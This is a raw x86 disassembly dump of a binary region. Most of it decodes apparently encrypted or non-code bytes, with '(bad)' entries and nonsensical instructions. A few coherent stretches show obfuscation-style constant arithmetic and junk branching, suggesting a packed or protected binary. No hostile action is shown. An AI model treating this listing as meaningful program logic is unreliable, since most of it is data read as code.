  41a4ad:	sar    BYTE PTR [ebp+0x301f7e36],1
  41a4b3:	and    esi,DWORD PTR [eax+0x7d86b0c2]
  41a4b9:	xchg   esp,eax
  41a4ba:	mov    ch,dh
  41a4bc:	sbb    edi,DWORD PTR [esi+0x588f82dc]
  41a4c2:	in     al,0x1e
  41a4c4:	ret    0x7a42
  41a4c7:	cli    
  41a4c8:	jns    0x41a505
  41a4ca:	add    esi,ecx
  41a4cc:	inc    eax
  41a4cd:	ins    BYTE PTR es:[edi],dx
  41a4ce:	pop    ebx
  41a4cf:	pop    ss
  41a4d0:	inc    ebp
  41a4d1:	ror    DWORD PTR [esi],cl
  41a4d3:	imul   eax,DWORD PTR [ebx],0xae1d979
  41a4d9:	xchg   DWORD PTR [esi+0x3c70fa45],edx
  41a4df:	push   cs
  41a4e0:	aaa    
  41a4e1:	data16 std 
  41a4e3:	(bad)  
  41a4e4:	jge    0x41a489
  41a4e6:	shr    DWORD PTR [ecx-0x63061334],1
  41a4ec:	call   0x90b9:0x6fad8c00
  41a4f3:	sbb    esp,eax
  41a4f5:	popa   
  41a4f6:	retf   
  41a4f7:	sub    ebp,ebx
  41a4f9:	aaa    
  41a4fa:	pop    esp
  41a4fb:	mul    BYTE PTR [esi]
  41a4fd:	call   0x27ee:0x6c74a570
  41a504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a505:	and    bh,bl
  41a507:	cmp    ebx,0xfffffffc
  41a50a:	mov    DWORD PTR [edi-0x68d85e6b],eax
  41a510:	sar    DWORD PTR [edi],0x4c
  41a513:	popa   
  41a514:	pop    esi
  41a515:	push   esp
  41a516:	loop   0x41a523
  41a518:	xchg   ax,ax
  41a51a:	adc    ah,BYTE PTR [edx]
  41a51c:	add    al,0xd7
  41a51e:	pop    esp
  41a51f:	(bad)  
  41a520:	pop    ebp
  41a521:	rcl    DWORD PTR [ecx-0x59],cl
  41a524:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a525:	cdq    
  41a526:	rcr    BYTE PTR [ebx],cl
  41a528:	shr    bl,cl
  41a52a:	iret   
  41a52b:	les    edx,FWORD PTR [eax]
  41a52d:	sahf   
  41a52e:	daa    
  41a52f:	xchg   edx,eax
  41a530:	std    
  41a531:	fisttp QWORD PTR [ebp+0x56d478fb]
  41a537:	ffree  st(0)
  41a539:	sub    al,BYTE PTR [edx+0x9a366f0]
  41a53f:	out    dx,al
  41a540:	mov    WORD PTR [eax-0x72acdb94],fs
  41a546:	mov    eax,0xfe94b4a0
  41a54b:	cmp    al,cl
  41a54d:	cmp    eax,0xd3bc20b3
  41a552:	scas   al,BYTE PTR es:[edi]
  41a553:	push   esi
  41a554:	cmp    BYTE PTR [eax-0x51],bh
  41a557:	and    ecx,esp
  41a559:	push   ss
  41a55a:	push   eax
  41a55b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a55c:	int3   
  41a55d:	mov    dh,0x22
  41a55f:	addr16 jp 0x41a512
  41a562:	push   edi
  41a563:	shr    ebx,1
  41a565:	aaa    
  41a566:	mov    bh,0x76
  41a568:	aam    0x80
  41a56a:	hlt    
  41a56b:	mov    dh,0xbd
  41a56d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a56e:	dec    edx
  41a56f:	xchg   DWORD PTR [ecx],ecx
  41a571:	(bad)  
  41a572:	repnz mov eax,0x539ffba2
  41a578:	cmp    DWORD PTR [ebx+ebp*8-0x320c0f52],ebp
  41a57f:	mov    edx,0xf0e096c
  41a584:	add    eax,0x39d60b93
  41a589:	rcl    DWORD PTR ds:0x75139d89,0xf0
  41a590:	cmp    ch,BYTE PTR [ebp+eiz*4-0x7a]
  41a594:	push   esi
  41a595:	loop   0x41a52b
  41a597:	mov    al,0xa2
  41a599:	push   ss
  41a59a:	outs   dx,BYTE PTR ds:[esi]
  41a59b:	daa    
  41a59c:	sub    DWORD PTR ds:[edi+0x73775d38],ecx
  41a5a3:	mov    bl,BYTE PTR [ecx+0x7e]
  41a5a6:	xchg   ebp,eax
  41a5a7:	sbb    eax,0x1e88f65
  41a5ac:	jmp    0x682e6ae4
  41a5b1:	popa   
  41a5b2:	or     BYTE PTR [esi+eiz*1-0x5ad60fe2],ah
  41a5b9:	sub    BYTE PTR [esp+ebp*1-0x41612616],bh
  41a5c0:	fimul  DWORD PTR [ebx+0xf1c2454]
  41a5c6:	lods   al,BYTE PTR ds:[esi]
  41a5c7:	rol    DWORD PTR [edx],1
  41a5c9:	xor    ecx,eax
  41a5cb:	mov    eax,DWORD PTR [esp+0x18]
  41a5cf:	shl    eax,0x1e
  41a5d2:	shr    edx,0x2
  41a5d5:	mov    edx,DWORD PTR [esp+0x1c]
  41a5d9:	xor    eax,eax
  41a5db:	or     eax,ecx
  41a5dd:	mov    ecx,DWORD PTR [esp+0x68]
  41a5e1:	mov    DWORD PTR [ecx],eax
  41a5e3:	mov    eax,DWORD PTR [esp+0x68]
  41a5e7:	mov    ecx,DWORD PTR [esp+0x68]
  41a5eb:	mov    eax,DWORD PTR [eax]
  41a5ed:	cmp    eax,DWORD PTR [ecx]
  41a5ef:	jne    0x41a916
  41a5f5:	mov    eax,DWORD PTR [esp+0x5c]
  41a5f9:	mov    ecx,DWORD PTR [esp+0x5c]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	cmp    eax,DWORD PTR [ecx]
  41a601:	jne    0x41a916
  41a607:	mov    BYTE PTR [esp+0x2c],0x20
  41a60c:	mov    BYTE PTR [esp+0x38],0x3
  41a611:	jmp    0x41a86e
  41a616:	cs lock pop ebp
  41a619:	jne    0x41a5ba
  41a61b:	js     0x41a653
  41a61d:	mov    eax,0x90d3c3ca
  41a622:	cmp    DWORD PTR [edx+ebx*1-0x3fdc832f],0xbec235be
  41a62d:	mov    esi,0xdb388105
  41a632:	retf   0xd7f
  41a635:	or     BYTE PTR [eax],cl
  41a637:	jno    0x41a6aa
  41a639:	cld    
  41a63a:	jne    0x41a6a7
  41a63c:	push   ecx
  41a63d:	scas   al,BYTE PTR es:[edi]
  41a63e:	or     BYTE PTR [eax+edx*8-0x2a],0xc5
  41a643:	xchg   edx,eax
  41a644:	sbb    eax,0x254bd42a
  41a649:	and    eax,DWORD PTR [eax+0x5279d63f]
  41a64f:	out    dx,al
  41a650:	mov    edi,0x2e6c5dd6
  41a655:	sub    ebp,DWORD PTR [esi+0x20]
  41a658:	dec    ebx
  41a659:	jecxz  0x41a69b
  41a65b:	push   edi
  41a65c:	jge    0x41a657
  41a65e:	out    dx,al
  41a65f:	ret    0xad0b
  41a662:	cwde   
  41a663:	mov    cl,0x1f
  41a665:	xchg   ebp,eax
  41a666:	dec    edx
  41a667:	fidivr WORD PTR [esi+ecx*1+0x7d]
  41a66b:	xchg   esi,eax
  41a66c:	xchg   edi,eax
  41a66d:	cld    
  41a66e:	or     BYTE PTR [esi+0x2b],ch
  41a671:	xor    eax,0x75bddfb3
  41a676:	loopne 0x41a6aa
  41a678:	push   es
  41a679:	mov    ecx,DWORD PTR [edi+0x14]
  41a67c:	inc    esi
  41a67d:	repnz push ecx
  41a67f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a680:	pop    ecx
  41a681:	inc    ebx
  41a682:	aaa    
  41a683:	pop    ds
  41a684:	push   es
  41a685:	pop    ss
  41a686:	and    BYTE PTR [edi-0x4d],dh
  41a689:	lods   eax,DWORD PTR ds:[esi]
  41a68a:	sbb    al,BYTE PTR ds:[esi+0x9]
  41a68e:	imul   ecx,esi,0x99320fb2
  41a694:	(bad)  
  41a695:	cld    
  41a696:	jnp    0x41a677
  41a698:	jmp    0x240dbdd9
  41a69d:	call   0xd872:0x2f70d64f
  41a6a4:	sub    dh,0x8d
  41a6a7:	fisub  WORD PTR [eax+eiz*8]
  41a6aa:	out    dx,eax
  41a6ab:	inc    edi
  41a6ac:	shr    DWORD PTR [edi],0x15
  41a6af:	lahf   
  41a6b0:	mov    dl,0xea
  41a6b2:	cmp    ax,0x18f
  41a6b6:	lods   eax,DWORD PTR ds:[esi]
  41a6b7:	rcl    BYTE PTR [eax],1
  41a6b9:	inc    esp
  41a6ba:	dec    edi
  41a6bb:	mov    al,ds:0x63916baf
  41a6c0:	sub    ch,dh
  41a6c2:	mov    esp,0x71d70059
  41a6c7:	ret    0xb74f
  41a6ca:	out    0xdb,al
  41a6cc:	pop    esi
  41a6cd:	pop    ecx
  41a6ce:	sar    BYTE PTR [ebx+edi*4-0x19],0x11
  41a6d3:	push   es
  41a6d4:	retf   
  41a6d5:	cmp    BYTE PTR [edx-0x431f4da8],ch
  41a6db:	push   esi
  41a6dc:	push   esp
  41a6dd:	or     DWORD PTR [eax],0xfffffff0
  41a6e0:	mov    eax,ds:0xd063090
  41a6e5:	pop    ecx
  41a6e6:	les    edx,FWORD PTR ds:[edx]
  41a6e9:	cmp    esi,DWORD PTR [ebx+0x4f9d9256]
  41a6ef:	(bad)
  41a6f2:	sbb    BYTE PTR [edi-0x27],dl
  41a6f5:	lock data16 jmp 0x41a6f6
  41a6f9:	mov    esi,0x68bd1bf3
  41a6fe:	test   BYTE PTR fs:[ebx],ah
  41a701:	imul   edx,DWORD PTR [ebx-0x3126709f],0x153dd1d6
  41a70b:	nop
  41a70c:	add    bl,BYTE PTR [ebx-0x8b6aedc]
  41a712:	ror    ebx,1
  41a714:	mov    ecx,0x4e6ba7d1
  41a719:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a71a:	(bad)  
  41a71b:	push   esi
  41a71c:	icebp  
  41a71d:	push   es
  41a71e:	inc    ebp
  41a71f:	add    BYTE PTR [ebp-0x70],0xbc
  41a723:	xchg   esp,eax
  41a724:	(bad)  
  41a725:	cmp    ch,BYTE PTR [ecx]
  41a727:	cmp    dl,BYTE PTR [esi+edi*1-0x9]
  41a72b:	push   eax
  41a72c:	std    
  41a72d:	int3   
  41a72e:	rol    DWORD PTR [ebx+ebx*1-0x34],1
  41a732:	sub    al,0x15
  41a734:	call   eax
  41a736:	pop    DWORD PTR [ebp+0x5fc335a4]
  41a73c:	and    DWORD PTR [edx+0x20c82cf],0x2fbb22c1
  41a746:	pop    ds
  41a747:	xor    ebp,DWORD PTR gs:[edi+0x43]
  41a74b:	rol    BYTE PTR [eax+ebx*2],cl
  41a74e:	and    BYTE PTR [edx],bh
  41a750:	mov    ecx,0x96242352
  41a755:	inc    edi
  41a756:	jnp    0x41a7ad
  41a758:	fimul  WORD PTR [ebx]
  41a75a:	sbb    BYTE PTR [eax+ecx*8-0x9c8ccc7],dl
  41a761:	cmp    cl,al
  41a763:	jbe    0x41a6f6
  41a765:	in     eax,dx
  41a766:	sahf   
  41a767:	ins    DWORD PTR es:[edi],dx
  41a768:	ins    BYTE PTR es:[edi],dx
  41a769:	lahf   
  41a76a:	lds    edx,FWORD PTR [esi]
  41a76c:	leave  
  41a76d:	mov    ebx,0x974ced68
  41a772:	jmp    0x41a7e6
  41a774:	out    dx,al
  41a775:	push   0x3f
  41a777:	pop    es
  41a778:	adc    eax,0x7fd33bb6
  41a77d:	lds    eax,FWORD PTR [ecx+0x0]
  41a780:	jbe    0x41a77f
  41a782:	add    eax,DWORD PTR [esi]
  41a784:	jl     0x41a713
  41a786:	add    esi,edx
  41a788:	mov    esp,0x6ea31716
  41a78d:	dec    eax
  41a78e:	jo     0x41a74a
  41a790:	pop    edx
  41a791:	shr    DWORD PTR [ecx-0x295de46a],cl
  41a797:	aam    0xb
  41a799:	sahf   
  41a79a:	inc    edi
  41a79b:	sbb    dl,0xaa
  41a79e:	(bad)  
  41a79f:	mov    eax,ds:0xce8c2577
  41a7a4:	and    al,0x39
  41a7a6:	mov    BYTE PTR [eax-0x65],bl
  41a7a9:	std    
  41a7aa:	lods   al,BYTE PTR ds:[esi]
  41a7ab:	aam    0xc7
  41a7ad:	ins    BYTE PTR es:[edi],dx
  41a7ae:	or     DWORD PTR [ebx+0x5c8f8ae7],edx
  41a7b4:	push   eax
  41a7b5:	xchg   edi,eax
  41a7b6:	jecxz  0x41a76e
  41a7b8:	ficom  DWORD PTR [eax+eiz*8-0x766df9d3]
  41a7bf:	cdq    
  41a7c0:	mov    ch,bl
  41a7c2:	adc    DWORD PTR [ebx+0x18],esi
  41a7c5:	ret    0x9456
  41a7c8:	xchg   DWORD PTR [edx+ebp*1-0x2402c55a],ecx
  41a7cf:	add    al,0x3e
  41a7d1:	ins    DWORD PTR es:[edi],dx
  41a7d2:	lds    ebp,FWORD PTR [edx]
  41a7d4:	and    DWORD PTR [ebx+ebp*8+0x37],0x153b848a
  41a7dc:	shr    DWORD PTR [edx],cl
  41a7de:	shr    DWORD PTR [ebx+edx*1-0x2a],1
  41a7e2:	lods   eax,DWORD PTR ds:[esi]
  41a7e3:	cs mov dl,0xa0
  41a7e6:	push   esp
  41a7e7:	add    al,0xa5
  41a7e9:	mov    edx,0xfe9882a1
  41a7ee:	xlat   BYTE PTR ds:[ebx]
  41a7ef:	(bad)
  41a7f2:	cwde   
  41a7f3:	pop    esi
  41a7f4:	es cdq 
  41a7f6:	jb     0x41a848
  41a7f8:	out    dx,al
  41a7f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7fa:	mov    BYTE PTR [ecx-0x40],bh
  41a7fd:	push   ebp
  41a7fe:	sbb    bl,dh
  41a800:	jg     0x41a864
  41a802:	xchg   edx,eax
  41a803:	mov    ch,bl
  41a805:	fsubrp st(1),st
  41a807:	mov    es,WORD PTR [ebx+0x9]
  41a80a:	mov    eax,0xb318102a
  41a80f:	jae    0x41a849
  41a811:	xchg   DWORD PTR [eax],edi
  41a813:	add    al,0x53
  41a815:	mov    dl,0x6e
  41a817:	repz test BYTE PTR [edi+edi*4-0x60],bh
  41a81c:	aas    
  41a81d:	jl     0x41a83d
  41a81f:	sub    esp,DWORD PTR [ebx-0x2]
  41a822:	xchg   edi,eax
  41a823:	mov    ds:0x9eee1ef3,al
  41a828:	cld    
  41a829:	jne    0x41a834
  41a82b:	pop    ds
  41a82c:	in     eax,dx
  41a82d:	inc    eax
  41a82e:	out    0x79,al
  41a830:	lea    ebx,[edi+edi*4+0x3c88cacc]
  41a837:	rcr    BYTE PTR [edx],1
  41a839:	pusha  
  41a83a:	aas    
  41a83b:	call   0x8f38:0x48c372b5
  41a842:	fwait
  41a843:	out    dx,eax
  41a844:	mov    dl,0x90
  41a846:	xlat   BYTE PTR ds:[ebx]
  41a847:	outs   dx,DWORD PTR ds:[esi]
  41a848:	jmp    0xd0849ed9
  41a84d:	xchg   ebx,eax
  41a84e:	sbb    eax,0xff16eb41
  41a853:	push   esi
  41a854:	pop    ss
  41a855:	retf   0x7202
  41a858:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a859:	pusha  
  41a85a:	jo     0x41a81c
  41a85c:	mov    eax,0x474399cc
  41a861:	iret   
  41a862:	add    al,0x7f
  41a864:	sahf   
  41a865:	pop    ds
  41a866:	mov    bh,0x12
  41a868:	lea    esi,[ebx+0x1b709c0b]
  41a86e:	mov    BYTE PTR [esp+0x3c],0x6d
  41a873:	mov    BYTE PTR [esp+0x2b],0x90
  41a878:	mov    al,BYTE PTR [esp+0x2b]
  41a87c:	mov    cl,BYTE PTR [esp+0x3c]
  41a880:	or     al,0xdc
  41a882:	sub    al,cl
  41a884:	mov    cl,BYTE PTR [esp+0x38]
  41a888:	sub    al,0x56
  41a88a:	movzx  eax,al
  41a88d:	movzx  ecx,cl
  41a890:	cdq    
  41a891:	idiv   ecx
  41a893:	movzx  ecx,BYTE PTR [esp+0x2c]
  41a898:	or     eax,ecx
  41a89a:	mov    BYTE PTR [esp+0xc],al
  41a89e:	mov    BYTE PTR [esp+0x24],0x1
  41a8a3:	mov    BYTE PTR [esp+0x2b],0xcf
  41a8a8:	mov    BYTE PTR [esp+0x3c],0x6
  41a8ad:	mov    BYTE PTR [esp+0x38],0x25
  41a8b2:	mov    BYTE PTR [esp+0x2c],0xf8
  41a8b7:	mov    al,BYTE PTR [esp+0x2c]
  41a8bb:	mov    cl,BYTE PTR [esp+0x38]
  41a8bf:	or     al,0xc4
  41a8c1:	and    al,cl
  41a8c3:	mov    cl,BYTE PTR [esp+0x3c]
  41a8c7:	imul   cl
  41a8c9:	mov    cl,BYTE PTR [esp+0x2b]
  41a8cd:	movzx  ecx,cl
  41a8d0:	movzx  eax,al
  41a8d3:	and    eax,ecx
  41a8d5:	mov    cl,BYTE PTR [esp+0x24]
  41a8d9:	movzx  ecx,cl
  41a8dc:	cdq    
  41a8dd:	idiv   ecx
  41a8df:	mov    cl,BYTE PTR [esp+0xc]
  41a8e3:	cmp    cl,al
  41a8e5:	je     0x41a93c
  41a8eb:	lea    eax,[esp+0x9c]
  41a8f2:	push   eax
  41a8f3:	lea    edi,[esp+0x80]
  41a8fa:	call   0x40b68c
  41a8ff:	cmp    eax,ebx
  41a901:	jne    0x41a93c
  41a907:	cmp    edx,esi
  41a909:	jne    0x41a93c
  41a90f:	xor    eax,eax
  41a911:	jmp    0x41b43e
  41a916:	mov    eax,DWORD PTR [esp+0x70]
  41a91a:	mov    ecx,DWORD PTR [esp+0x74]
  41a91e:	mov    edx,DWORD PTR [esp+0x18]
  41a922:	mov    edi,DWORD PTR [esp+0x1c]
  41a926:	add    eax,edx
  41a928:	adc    ecx,edi
  41a92a:	mov    DWORD PTR [esp+0x18],eax
  41a92e:	mov    DWORD PTR [esp+0x1c],ecx
  41a932:	jmp    0x41a93c
  41a937:	mov    ebx,0xcb79b576
  41a93c:	push   0x4
  41a93e:	push   0x422708
  41a943:	lea    eax,[esp+0x6c]
  41a947:	push   eax
  41a948:	call   0x411c08
  41a94d:	mov    eax,DWORD PTR [esp+0x64]
  41a951:	push   0x4
  41a953:	push   DWORD PTR [eax+0x1a4]
  41a959:	lea    eax,[esp+0x74]
  41a95d:	push   eax
  41a95e:	call   0x411c08
  41a963:	mov    eax,DWORD PTR [esp+0x64]
  41a967:	mov    eax,DWORD PTR [eax+0x1a4]
  41a96d:	mov    eax,DWORD PTR [eax]
  41a96f:	mov    ecx,DWORD PTR [esp+0x64]
  41a973:	mov    eax,DWORD PTR [eax+0x3c]
  41a976:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41a97c:	mov    ecx,DWORD PTR [ecx]
  41a97e:	lea    eax,[ecx+eax*1+0x28]
  41a982:	mov    eax,DWORD PTR [eax]
  41a984:	add    DWORD PTR [esp+0x6c],eax
  41a988:	mov    DWORD PTR [esp+0x30],0x127
  41a990:	mov    DWORD PTR [esp+0x10],0x421a
  41a998:	mov    eax,DWORD PTR [esp+0x10]
  41a99c:	jmp    0x41abf9
  41a9a1:	add    BYTE PTR [edx-0x4b9c4ca1],al
  41a9a7:	adc    al,0xb2
  41a9a9:	sub    eax,0xbcd15a28
  41a9ae:	xlat   BYTE PTR ds:[ebx]
  41a9af:	scas   al,BYTE PTR es:[edi]
  41a9b0:	iret   
  41a9b1:	repz sub eax,eax
  41a9b4:	mov    esi,0xbebec235
  41a9b9:	pop    ebp
  41a9ba:	push   cs
  41a9bb:	xchg   cl,al
  41a9bd:	adc    eax,0x75e340c
  41a9c2:	je     0x41a9d2
  41a9c4:	fisttp DWORD PTR [ebp+0x48]
  41a9c7:	scas   al,BYTE PTR es:[edi]
  41a9c8:	stos   DWORD PTR es:[edi],eax
  41a9c9:	mov    dh,0x2f
  41a9cb:	popa   
  41a9cc:	test   DWORD PTR [ecx+0x4e78dd8f],edx
  41a9d2:	pop    edx
  41a9d3:	in     eax,dx
  41a9d4:	or     al,BYTE PTR [edx+edx*8+0x1128aea]
  41a9db:	adc    DWORD PTR [edx],edi
  41a9dd:	xor    eax,0xc7b63dc5
  41a9e2:	push   cs
  41a9e3:	mov    ch,0xe1
  41a9e5:	cdq    
  41a9e6:	jne    0x41a999
  41a9e8:	add    DWORD PTR [ebx],ecx
  41a9ea:	sbb    DWORD PTR [ebx+ecx*4+0xc7a35fc],esp
  41a9f1:	xor    dh,al
  41a9f3:	lds    edi,FWORD PTR [eax]
  41a9f5:	call   0xc217:0xd10f
  41a9fb:	and    DWORD PTR [eax+0x7a24864e],ecx
  41aa01:	add    bl,BYTE PTR [eax]
  41aa03:	daa    
  41aa04:	jmp    FWORD PTR [ebx]
  41aa06:	cli    
  41aa07:	mov    DWORD PTR ds:0x584c8a56,ebp
  41aa0d:	inc    ebp
  41aa0e:	rep outs dx,DWORD PTR ds:[esi]
  41aa10:	mov    dh,0x9a
  41aa12:	ret    0xec07
  41aa15:	sub    eax,edx
  41aa17:	rol    cl,cl
  41aa19:	or     BYTE PTR [edx+edx*1+0x7bb0b0d2],bl
  41aa20:	pop    ebx
  41aa21:	sub    eax,0xe198dce5
  41aa26:	or     eax,0x198bb8a3
  41aa2b:	push   ds
  41aa2c:	adc    al,0x3f
  41aa2e:	xor    al,0x1a
  41aa30:	xor    eax,0xbb63502b
  41aa35:	imul   dl
  41aa37:	(bad)  
  41aa38:	cld    
  41aa39:	add    BYTE PTR [esi+0x78e4b815],bh
  41aa3f:	jo     0x41aaab
  41aa41:	scas   eax,DWORD PTR es:[edi]
  41aa42:	add    eax,0x375effe4
  41aa47:	dec    ebp
  41aa48:	mov    edx,0xc52ceac2
  41aa4d:	pop    eax
  41aa4e:	pop    ebp
  41aa4f:	fcmovnbe st,st(7)
  41aa51:	sbb    BYTE PTR [ebp-0xc],ch
  41aa54:	test   eax,0x12522593
  41aa59:	js     0x41aa6f
  41aa5b:	jge    0x41aa77
  41aa5d:	in     eax,0x78
  41aa5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa60:	adc    al,0x26
  41aa62:	mov    bl,0x8f
  41aa64:	push   0x9e8bd3af
  41aa69:	bound  ebp,QWORD PTR [edx+ecx*2+0x59]
  41aa6d:	mov    edi,0xf593815d
  41aa72:	inc    ebx
  41aa73:	lock das 
  41aa75:	cs ja  0x41aabb
  41aa78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa79:	jne    0x41aaac
  41aa7b:	lds    esi,FWORD PTR ds:0xdb32f763
  41aa81:	inc    edi
  41aa82:	(bad)  
  41aa83:	jnp    0x41aa22
  41aa85:	xor    al,0x5e
  41aa87:	mov    edx,0x26f327e2
  41aa8c:	dec    eax
  41aa8d:	aad    0x85
  41aa8f:	mov    dl,BYTE PTR [eax+0x6103c755]
  41aa95:	xlat   BYTE PTR ds:[ebx]
  41aa96:	packuswb mm0,QWORD PTR [ebx+ebx*1-0x7deffe5b]
  41aa9e:	fidiv  WORD PTR [ebx+0x21]
  41aaa1:	(bad)  [edi]
  41aaa3:	std    
  41aaa4:	jmp    0x41aa72
  41aaa6:	dec    esp
  41aaa7:	dec    esi
  41aaa8:	ffree  st(0)
  41aaaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aaab:	scas   eax,DWORD PTR es:[edi]
  41aaac:	cmp    DWORD PTR [eax],esp
  41aaae:	test   eax,0xfa890e91
  41aab3:	xor    BYTE PTR [edx],ah
  41aab5:	call   0xa11dc0bf
  41aaba:	or     BYTE PTR [edx],bl
  41aabc:	fldenv [ecx]
  41aabe:	jecxz  0x41ab29
  41aac0:	fsub   QWORD PTR [edx+ecx*2-0x6b]
  41aac4:	add    DWORD PTR [ecx+ecx*2-0x2b69dc5a],esi
  41aacb:	test   al,0xdd
  41aacd:	imul   eax,ebp,0x2ce0c287
  41aad3:	mov    ds:0x93abc2df,al
  41aad8:	cdq    
  41aad9:	popa   
  41aada:	test   dl,dh
  41aadc:	aaa    
  41aadd:	(bad)  
  41aade:	jbe    0x41aaee
  41aae0:	ret    0xdfe
  41aae3:	add    eax,0x93517b92
  41aae8:	je     0x41ab0a
  41aaea:	shl    DWORD PTR [edx-0x6f],1
  41aaed:	cmp    BYTE PTR [ecx+0x1ba1c7f1],ah
  41aaf3:	jecxz  0x41aac4
  41aaf5:	push   edx
  41aaf6:	imul   esi,DWORD PTR [ecx],0x5acc4d8
  41aafc:	fdivr  st(7),st
  41aafe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aaff:	or     DWORD PTR [esi],eax
  41ab01:	sahf   
  41ab02:	scas   eax,DWORD PTR es:[edi]
  41ab03:	cdq    
  41ab04:	xchg   BYTE PTR ds:0x86d00549,cl
  41ab0a:	jmp    0x41ab1c
  41ab0c:	test   esp,0xf9ba9d78
  41ab12:	cmp    al,0xc0
  41ab14:	mov    ecx,0x10e1565a
  41ab19:	xchg   BYTE PTR [eax],cl
  41ab1b:	push   ebx
  41ab1c:	and    edx,eax
  41ab1e:	pop    es
  41ab1f:	es hlt 
  41ab21:	mov    edx,0x8366624f
  41ab26:	nop
  41ab27:	dec    eax
  41ab28:	dec    esp
  41ab29:	aaa    
  41ab2a:	cmp    BYTE PTR [eax],al
  41ab2c:	sub    eax,0xfc63bad7
  41ab31:	scas   al,BYTE PTR es:[edi]
  41ab32:	jecxz  0x41aaf0
  41ab34:	loopne 0x41aabb
  41ab36:	adc    eax,0xffffffd4
  41ab39:	add    DWORD PTR [eax+ebx*2],ebp
  41ab3c:	sbb    BYTE PTR [esi-0x7bab1383],al
  41ab42:	adc    bh,0x3d
  41ab45:	outs   dx,BYTE PTR ds:[esi]
  41ab46:	or     eax,edx
  41ab48:	cdq    
  41ab49:	ror    DWORD PTR [ecx+ebx*1+0x4b],cl
  41ab4d:	jp     0x41ab68
  41ab4f:	nop
  41ab50:	push   esp
  41ab51:	imul   BYTE PTR [ecx+0x6b]
  41ab54:	ins    BYTE PTR es:[edi],dx
  41ab55:	and    DWORD PTR [edi],esi
  41ab57:	shl    BYTE PTR gs:[ebx-0x649fa372],1
  41ab5e:	pop    ebx
  41ab5f:	push   esi
  41ab60:	fcom   QWORD PTR [ebx]
  41ab62:	mov    ds:0xf4d0f4f2,al
  41ab67:	add    BYTE PTR [edx],al
  41ab69:	mov    WORD PTR [esi-0x4f],cs
  41ab6c:	(bad)  
  41ab6d:	push   ebx
  41ab6e:	into   
  41ab6f:	imul   esp,ebx,0xffffffe0
  41ab72:	(bad)  
  41ab73:	dec    ebp
  41ab74:	aas    
  41ab75:	or     ch,BYTE PTR [edx-0x1f]
  41ab78:	sbb    BYTE PTR [ecx+0x74],0x92
  41ab7c:	(bad)  
  41ab7d:	mov    esi,0x7483e658
  41ab82:	outs   dx,BYTE PTR ds:[esi]
  41ab83:	out    dx,al
  41ab84:	les    eax,FWORD PTR [ebx+0x7936e4ea]
  41ab8a:	dec    eax
  41ab8b:	jp     0x41ab27
  41ab8d:	jbe    0x41abe3
  41ab8f:	pusha  
  41ab90:	ret    
  41ab91:	jb     0x41ab98
  41ab93:	jno    0x41abe1
  41ab95:	sti    
  41ab96:	mov    ecx,0x17202004
  41ab9b:	mov    dl,0x3f
  41ab9d:	test   ebx,ecx
  41ab9f:	out    0x2b,eax
  41aba1:	leave  
  41aba2:	mov    dl,BYTE PTR [eax]
  41aba4:	push   eax
  41aba5:	int3   
  41aba6:	cwde   
  41aba7:	pop    edx
  41aba8:	shl    BYTE PTR [ebp-0x1],0x1f
  41abac:	xor    cl,BYTE PTR [edi]
  41abae:	fild   QWORD PTR [edi+0x400c0506]
  41abb4:	frstor [ecx-0x80]
  41abb7:	neg    WORD PTR [edx]
  41abba:	fsub   QWORD PTR [ecx]
  41abbc:	stc    
  41abbd:	jle    0x41abb2
  41abbf:	mov    al,0x67
  41abc1:	fbld   TBYTE PTR [esi-0x1c2da427]
  41abc7:	lods   al,BYTE PTR ds:[esi]
  41abc8:	test   ch,dh
  41abca:	pusha  
  41abcb:	in     eax,dx
  41abcc:	ror    BYTE PTR [eax],1
  41abce:	sbb    eax,0x3ebf7a7e
  41abd3:	xor    al,0x32
  41abd5:	lods   eax,DWORD PTR ds:[esi]
  41abd6:	daa    
  41abd7:	retf   
  41abd8:	mov    dh,0xe7
  41abda:	out    0x20,eax
  41abdc:	ins    DWORD PTR es:[edi],dx
  41abdd:	mov    bh,0x7f
  41abdf:	fstp   DWORD PTR [edi+0x53e5235e]
  41abe5:	cmp    esp,DWORD PTR [ebx+ecx*4+0xb]
  41abe9:	mov    al,0x70
  41abeb:	cs xor eax,0x725b8c03
  41abf1:	fwait
  41abf2:	sahf   
  41abf3:	repnz lods eax,DWORD PTR ds:[esi]
  41abf5:	xchg   edi,eax
  41abf6:	cli    
  41abf7:	cld    
  41abf8:	mov    dl,0x25
  41abfa:	inc    esp
  41abfb:	ret    0xffff
  41abfe:	add    eax,DWORD PTR [esp+0x30]
  41ac02:	and    eax,0xfffffe5a
  41ac07:	jmp    0x41ae64
  41ac0c:	xor    DWORD PTR [edi-0x1f],ebp
  41ac0f:	frstor [esp+esi*2+0x1832b431]
  41ac16:	test   bh,cl
  41ac18:	dec    ecx
  41ac19:	ss out dx,al
  41ac1b:	iret   
  41ac1c:	imul   ebp,DWORD PTR ds:0xc235bec0,0xffffffbe
  41ac23:	mov    esi,0xc3859926
  41ac28:	jl     0x41ac91
  41ac2a:	add    ah,ch
  41ac2c:	data16 xor dl,ah
  41ac2f:	mov    cl,0xe9
  41ac31:	mov    ?,WORD PTR [ebp+0x7c]
  41ac34:	sbb    edx,DWORD PTR ds:0xc2906f7b
  41ac3a:	sbb    eax,0x9d23be9b
  41ac3f:	jo     0x41ac5b
  41ac41:	mov    ch,BYTE PTR [edx+0x26716020]
  41ac47:	ret    
  41ac48:	nop
  41ac49:	out    0x8d,al
  41ac4b:	stc    
  41ac4c:	leave  
  41ac4d:	retf   
  41ac4e:	(bad)  
  41ac4f:	mov    dh,0xb6
  41ac51:	ror    DWORD PTR [edi],1
  41ac53:	shl    BYTE PTR [eax-0x54],cl
  41ac56:	lahf   
  41ac57:	inc    eax
